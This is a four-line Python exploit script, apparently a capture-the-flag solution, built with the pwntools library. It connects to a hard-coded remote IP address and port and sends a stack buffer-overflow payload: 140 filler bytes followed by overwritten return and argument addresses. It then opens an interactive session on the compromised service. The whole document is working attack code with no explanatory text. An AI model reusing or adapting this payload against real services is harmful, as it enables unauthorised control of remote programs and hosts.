from pwn import *
c=remote('18.219.124.199','20004')
c.sendline("A"*140 +"\xa0\x83\x04\x08"+"aaaa"+"\x10\x86\x04\x08")
c.interactive()
